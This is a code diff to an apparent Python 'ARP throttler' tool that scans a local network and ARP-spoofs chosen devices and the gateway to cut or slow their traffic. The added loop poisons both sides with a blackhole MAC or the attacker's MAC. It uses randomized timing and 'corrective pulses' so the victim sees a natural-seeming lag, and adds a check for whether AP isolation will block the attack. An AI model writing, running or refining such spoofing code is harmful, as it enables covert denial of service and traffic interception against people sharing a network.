@@ -1,17 +1,16 @@
 """
 Network Scanner & ARP Throttler Engine
 Handles network scanning, ARP spoofing for throttling, and device management.
-Uses multiple scan methods for maximum device detection on Windows.
+Uses multiple scan methods for maximum device detection.
 """
 
 from __future__ import annotations
 
 import json
 import logging
-import re
+import random
 import socket
 import struct
-import subprocess
 import threading
 import time
 from concurrent.futures import Future, ThreadPoolExecutor
@@ -31,6 +30,16 @@ import psutil
 from core.admin import is_admin as check_admin
 from core.models import NetworkDevice, NetworkInterface
 from core.oui import lookup_vendor
+from core.platform import disable_ip_forwarding as _platform_disable_ip_forwarding
+from core.platform import enable_ip_forwarding as _platform_enable_ip_forwarding
+from core.platform import flush_arp_cache as _platform_flush_arp
+from core.platform import (
+    get_default_gateway,
+    ping_command,
+    read_arp_table,
+    read_ip_forwarding_state,
+    subprocess_run,
+)
 
 
 class NetworkEngine:
@@ -54,6 +63,7 @@ class NetworkEngine:
         self._ip_forwarding_enabled_by_app: bool = False
         self._scan_sequence: int = 0
         self._last_scan_summary: dict[str, object] = {}
+        self._ap_isolation_detected: bool = False
         self.on_devices_updated: Optional[Callable[[], None]] = None
         self.on_status_changed: Optional[Callable[[str], None]] = None
         self._logger.info("NetworkEngine initialized")
@@ -169,45 +179,7 @@ class NetworkEngine:
 
     def _get_default_gateway(self, interface_ip: str) -> str:
         """Find the default gateway for the given interface IP."""
-        try:
-            result = subprocess.run(
-                ["powershell", "-Command",
-                 "Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -ExpandProperty NextHop"],
-                capture_output=True, text=True, timeout=5,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            if result.returncode == 0:
-                for line in result.stdout.strip().split('\n'):
-                    line = line.strip()
-                    if line and self._is_same_subnet(interface_ip, line):
-                        return line
-                lines = result.stdout.strip().split('\n')
-                if lines and lines[0].strip():
-                    return lines[0].strip()
-        except Exception:
-            pass
-
-        # Fallback: try ipconfig
-        try:
-            result = subprocess.run(
-                ["ipconfig"], capture_output=True, text=True, timeout=5,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            if result.returncode == 0:
-                lines = result.stdout.split('\n')
-                found_ip = False
-                for line in lines:
-                    if interface_ip in line:
-                        found_ip = True
-                    if found_ip and ('gateway' in line.lower() or 'gerbang' in line.lower()):
-                        match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
-                        if match:
-                            return match.group(1)
-        except Exception:
-            pass
-
-        parts = interface_ip.split('.')
-        return f"{parts[0]}.{parts[1]}.{parts[2]}.1"
+        return get_default_gateway(interface_ip)
 
     def _is_same_subnet(self, ip1: str, ip2: str, mask: str = "255.255.255.0") -> bool:
         """Check if two IPs are in the same subnet."""
@@ -246,6 +218,7 @@ class NetworkEngine:
     ):
         """Scan devices on the selected network interface."""
         with self._state_lock:
+            self._ap_isolation_detected = False
             if not self.interface:
                 self._notify_status("ERROR: No interface selected!")
                 return
@@ -317,7 +290,7 @@ class NetworkEngine:
                 else:
                     self._ping_sweep(timeout_ms=320, workers=96)
 
-                # Method 2: ARP table from Windows (fresh after warm-up)
+                # Method 2: ARP table from system (fresh after warm-up)
                 self._notify_status("Step 2/4: Reading ARP table...")
                 self._scan_arp_table()
 
@@ -424,6 +397,8 @@ class NetworkEngine:
                         if future and not future.done():
                             future.cancel()
 
+                self._detect_ap_isolation()
+
                 self._logger.info(self._build_scan_log_event("scan.finish", **summary))
 
                 if self.on_devices_updated:
@@ -449,74 +424,30 @@ class NetworkEngine:
         self._scan_thread.start()
 
     def _scan_arp_table(self) -> None:
-        """Read devices from Windows ARP table (arp -a)."""
+        """Read devices from system ARP table (cross-platform)."""
         try:
             with self._state_lock:
                 if not self.interface:
                     return
                 subnet_prefix = '.'.join(self.interface.ip.split('.')[:3]) + '.'
 
-            result = subprocess.run(
-                ["arp", "-a"],
-                capture_output=True, text=True, timeout=4,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            if result.returncode != 0:
-                return
-
-            for ip, mac in self._parse_arp_table_entries(result.stdout, subnet_prefix):
+            for ip, mac in read_arp_table(subnet_prefix):
                 self._add_or_update_device(ip, mac)
 
         except Exception as e:
             self._notify_status(f"ARP table scan error: {e}")
 
-    @staticmethod
-    def _parse_arp_table_entries(arp_output: str, subnet_prefix: str) -> list[tuple[str, str]]:
-        """Parse Windows arp -a output and return (ip, mac) pairs."""
-        entries: list[tuple[str, str]] = []
-        for raw_line in arp_output.splitlines():
-            line = raw_line.strip()
-            match = re.match(
-                r'(\d+\.\d+\.\d+\.\d+)\s+([\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2})\s+(\w+)',
-                line
-            )
-            if not match:
-                continue
-
-            ip = match.group(1)
-            mac = match.group(2).replace('-', ':').lower()
-            entry_type = match.group(3).lower()
-
-            # Skip broadcast and multicast.
-            if mac == "ff:ff:ff:ff:ff:ff":
-                continue
-            if ip.endswith(".255"):
-                continue
-            if not ip.startswith(subnet_prefix):
-                continue
-
-            # Keep dynamic and static entries to improve detection accuracy.
-            if entry_type not in ("dynamic", "dinamis", "static", "statis"):
-                continue
-
-            entries.append((ip, mac))
-
-        return entries
-
     def _ping_sweep(self, timeout_ms: int = 250, workers: int = 64) -> None:
-        """Fast parallel ping sweep to warm ARP cache."""
+        """Fast parallel ping sweep to warm ARP cache (cross-platform)."""
         try:
             subnet_prefix = '.'.join(self.interface.ip.split('.')[:3])
             ips = [f"{subnet_prefix}.{i}" for i in range(1, 255)]
 
             def ping_ip(ip: str):
                 try:
-                    subprocess.run(
-                        ["ping", "-n", "1", "-w", str(timeout_ms), ip],
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
+                    subprocess_run(
+                        ping_command(ip, timeout_ms),
                         timeout=2,
-                        creationflags=subprocess.CREATE_NO_WINDOW
                     )
                 except Exception:
                     pass
@@ -583,29 +514,22 @@ class NetworkEngine:
             except Exception:
                 pass
 
-        # Fallback: read from arp table
+        # Fallback: read from arp table (cross-platform)
         try:
-            result = subprocess.run(
-                ["arp", "-a", gw_ip],
-                capture_output=True, text=True, timeout=5,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            for line in result.stdout.split('\n'):
-                match = re.search(
-                    r'([\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2}[:-][\da-fA-F]{2})',
-                    line
-                )
-                if match and gw_ip in line:
-                    mac = match.group(1).replace('-', ':').lower()
-                    if mac != 'ff:ff:ff:ff:ff:ff':
-                        with self._state_lock:
-                            if self.interface:
-                                self.interface.gateway_mac = mac
-                        self._add_or_update_device(gw_ip, mac)
-                        with self._state_lock:
-                            if gw_ip in self.devices:
-                                self.devices[gw_ip].is_gateway = True
-                        return
+            with self._state_lock:
+                if not self.interface:
+                    return
+                subnet_prefix = '.'.join(self.interface.ip.split('.')[:3]) + '.'
+            for ip, mac in read_arp_table(subnet_prefix):
+                if ip == gw_ip:
+                    with self._state_lock:
+                        if self.interface:
+                            self.interface.gateway_mac = mac
+                    self._add_or_update_device(gw_ip, mac)
+                    with self._state_lock:
+                        if gw_ip in self.devices:
+                            self.devices[gw_ip].is_gateway = True
+                    return
         except Exception:
             pass
 
@@ -802,36 +726,77 @@ class NetworkEngine:
                 gateway_mac
             )
             spoof_hwsrc = self._blackhole_mac(ip) if level == 0 else iface_mac
+            cycle = 0
+
+            def _corrective_pulse():
+                for _ in range(2):
+                    self._send_arp_reply(
+                        target_ip=ip, target_mac=target_mac,
+                        claimed_ip=gateway_ip, claimed_mac=gateway_mac,
+                        count=3
+                    )
+                    self._send_arp_reply(
+                        target_ip=gateway_ip, target_mac=gateway_mac,
+                        claimed_ip=ip, claimed_mac=target_mac,
+                        count=3
+                    )
+                    time.sleep(0.1)
 
             while not stop_event.is_set():
                 try:
-                    # Spoofed ARP: tell target that gateway IP is at spoofed MAC
-                    poison_count = 5 if level == 0 else 3
-                    self._send_arp_reply(
-                        target_ip=ip,
-                        target_mac=target_mac,
-                        claimed_ip=gateway_ip,
-                        claimed_mac=spoof_hwsrc,
-                        count=poison_count
-                    )
-
-                    # Spoofed ARP: tell gateway that target IP is at spoofed MAC
-                    self._send_arp_reply(
-                        target_ip=gateway_ip,
-                        target_mac=gateway_mac,
-                        claimed_ip=ip,
-                        claimed_mac=spoof_hwsrc,
-                        count=poison_count
-                    )
-
                     if level == 0:
+                        poison_count = 5
+                        self._send_arp_reply(
+                            target_ip=ip, target_mac=target_mac,
+                            claimed_ip=gateway_ip, claimed_mac=spoof_hwsrc,
+                            count=poison_count
+                        )
+                        self._send_arp_reply(
+                            target_ip=gateway_ip, target_mac=gateway_mac,
+                            claimed_ip=ip, claimed_mac=spoof_hwsrc,
+                            count=poison_count
+                        )
                         stop_event.wait(0.2)
-                    elif level <= 30:
-                        stop_event.wait(0.8)
-                    elif level <= 60:
-                        stop_event.wait(1.5)
+                        continue
+
+                    # Shaped throttling: variable timing for natural feel
+                    if level <= 25:
+                        slice_on = 0.4
+                        slice_off = 0.6
+                        pcount = 3
+                    elif level <= 50:
+                        slice_on = 0.3
+                        slice_off = 1.5
+                        pcount = 2
+                    elif level <= 75:
+                        slice_on = 0.2
+                        slice_off = 2.5
+                        pcount = 1
                     else:
-                        stop_event.wait(3.0)
+                        slice_on = 0.2
+                        slice_off = 4.0
+                        pcount = 1
+
+                    # Poison burst
+                    self._send_arp_reply(
+                        target_ip=ip, target_mac=target_mac,
+                        claimed_ip=gateway_ip, claimed_mac=spoof_hwsrc,
+                        count=pcount
+                    )
+                    self._send_arp_reply(
+                        target_ip=gateway_ip, target_mac=gateway_mac,
+                        claimed_ip=ip, claimed_mac=spoof_hwsrc,
+                        count=pcount
+                    )
+                    stop_event.wait(slice_on)
+
+                    # Every ~8 cycles insert a corrective pulse
+                    # so the target briefly recovers, creating a lag-like feel
+                    if level >= 30 and cycle % 8 == 0:
+                        _corrective_pulse()
+
+                    stop_event.wait(random.uniform(0.1, slice_off))
+                    cycle += 1
 
                 except Exception as e:
                     self._notify_status(f"Spoof error for {ip}: {e}")
@@ -915,11 +880,14 @@ class NetworkEngine:
                 device.throttle_level = 100
 
     def restore_all(self) -> None:
-        """Restore all throttled devices."""
+        """Restore all throttled devices in parallel."""
         with self._state_lock:
             throttled = [ip for ip, dev in self.devices.items() if dev.is_throttled]
-        for ip in throttled:
-            self.restore_device(ip)
+        if not throttled:
+            return
+        with ThreadPoolExecutor(max_workers=min(8, len(throttled))) as pool:
+            for _ in pool.map(self.restore_device, throttled):
+                pass
         self._notify_status("All devices restored to normal")
 
     def cleanup(self) -> None:
@@ -955,6 +923,7 @@ class NetworkEngine:
             "throttled_ips": throttled_ips,
             "throttle_thread_count": throttle_thread_count,
             "last_scan_summary": scan_summary,
+            "ap_isolation_detected": self._ap_isolation_detected,
             "devices": [vars(device) for device in devices],
             "log_tail": self._read_log_tail(log_tail_lines),
         }
@@ -981,33 +950,50 @@ class NetworkEngine:
         """Check if running with admin/elevated privileges."""
         return check_admin()
 
-    def _read_ip_forwarding_state(self) -> Optional[int]:
-        """Read IPEnableRouter registry value (0/1)."""
+    def get_ap_isolation_detected(self) -> bool:
+        """Return whether AP isolation was detected."""
+        with self._state_lock:
+            return self._ap_isolation_detected
+
+    def _detect_ap_isolation(self) -> None:
+        """
+        Detect AP isolation by sending a unicast ARP request to a discovered
+        non-gateway client. If broadcast scan discovered the client but unicast
+        ARP gets no reply, AP isolation is likely enabled on the access point.
+        """
+        if not SCAPY_AVAILABLE:
+            return
+        with self._state_lock:
+            candidates = [
+                (ip, dev.mac) for ip, dev in self.devices.items()
+                if not dev.is_self and not dev.is_gateway
+            ]
+            if not candidates:
+                return
+            ip, mac = candidates[0]
+            iface = self.interface.scapy_iface if self.interface and self.interface.scapy_iface else conf.iface
         try:
-            result = subprocess.run(
-                [
-                    "reg", "query",
-                    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
-                    "/v", "IPEnableRouter"
-                ],
-                capture_output=True,
-                text=True,
-                timeout=10,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            if result.returncode != 0:
-                return None
+            arp_req = Ether(dst=mac) / ARP(op=1, pdst=ip, hwdst=mac)
+            ans, _ = srp(arp_req, timeout=2, verbose=False, iface=iface)
+            with self._state_lock:
+                self._ap_isolation_detected = len(ans) == 0
+            if self._ap_isolation_detected:
+                self._logger.warning(
+                    "AP isolation detected — unicast ARP to %s (%s) failed",
+                    ip, mac
+                )
+                self._notify_status(
+                    "WARNING: AP isolation may be active. ARP spoof may not work."
+                )
+        except Exception as e:
+            self._logger.debug("AP isolation check error: %s", e)
 
-            match = re.search(r"IPEnableRouter\s+REG_DWORD\s+0x([0-9a-fA-F]+)", result.stdout)
-            if not match:
-                return None
-
-            return int(match.group(1), 16)
-        except Exception:
-            return None
+    def _read_ip_forwarding_state(self) -> Optional[int]:
+        """Read IP forwarding state (cross-platform)."""
+        return read_ip_forwarding_state()
 
     def enable_ip_forwarding(self) -> None:
-        """Enable IP forwarding on Windows."""
+        """Enable IP forwarding (cross-platform)."""
         try:
             current_state = self._read_ip_forwarding_state()
             self._ip_forwarding_original = current_state
@@ -1017,31 +1003,14 @@ class NetworkEngine:
                 self._notify_status("IP Forwarding already enabled")
                 return
 
-            subprocess.run(
-                ["powershell", "-Command",
-                 "Set-NetIPInterface -Forwarding Enabled -ErrorAction SilentlyContinue"],
-                capture_output=True, timeout=10,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            result = subprocess.run(
-                ["reg", "add",
-                 "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
-                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
-                capture_output=True, timeout=10,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            self._ip_forwarding_enabled_by_app = (
-                result.returncode == 0 and current_state == 0
-            )
-            if result.returncode == 0:
-                self._notify_status("IP Forwarding enabled")
-            else:
-                self._notify_status("Failed to enable IP Forwarding")
+            ok, msg = _platform_enable_ip_forwarding()
+            self._ip_forwarding_enabled_by_app = ok
+            self._notify_status(msg)
         except Exception as e:
             self._notify_status(f"Failed to enable IP forwarding: {e}")
 
     def disable_ip_forwarding(self) -> None:
-        """Disable IP forwarding on Windows."""
+        """Disable IP forwarding (cross-platform)."""
         if not self._ip_forwarding_enabled_by_app:
             self._logger.info(
                 "Skip disabling IP forwarding because app did not enable it."
@@ -1049,20 +1018,7 @@ class NetworkEngine:
             return
 
         try:
-            target_state = 0 if self._ip_forwarding_original != 1 else 1
-            subprocess.run(
-                ["powershell", "-Command",
-                 f"Set-NetIPInterface -Forwarding {'Enabled' if target_state == 1 else 'Disabled'} -ErrorAction SilentlyContinue"],
-                capture_output=True, timeout=10,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
-            subprocess.run(
-                ["reg", "add",
-                 "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
-                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", str(target_state), "/f"],
-                capture_output=True, timeout=10,
-                creationflags=subprocess.CREATE_NO_WINDOW
-            )
+            _platform_disable_ip_forwarding()
             self._notify_status("IP Forwarding restored to previous state")
         except Exception:
             pass
@@ -1071,35 +1027,11 @@ class NetworkEngine:
             self._ip_forwarding_original = None
 
     def flush_arp_cache(self, notify: bool = True) -> tuple[bool, str]:
-        """Flush Windows ARP cache (requires admin rights)."""
-        commands = [
-            ["cmd", "/c", "arp -d *"],
-            ["netsh", "interface", "ip", "delete", "arpcache"],
-        ]
-
-        for cmd in commands:
-            try:
-                result = subprocess.run(
-                    cmd,
-                    capture_output=True,
-                    text=True,
-                    timeout=10,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
-                if result.returncode == 0:
-                    message = "ARP cache flushed."
-                    if notify:
-                        self._notify_status(message)
-                    else:
-                        self._logger.info(message)
-                    return True, message
-            except Exception:
-                continue
-
-        message = "Failed to flush ARP cache. Run app as Administrator."
+        """Flush system ARP cache (cross-platform)."""
+        ok, message = _platform_flush_arp()
         if notify:
-            self._notify_status(message)
+            (self._notify_status if ok else self._logger.info)(message)
         else:
-            self._logger.warning(message)
-        return False, message
+            self._logger.info(message)
+        return ok, message
 
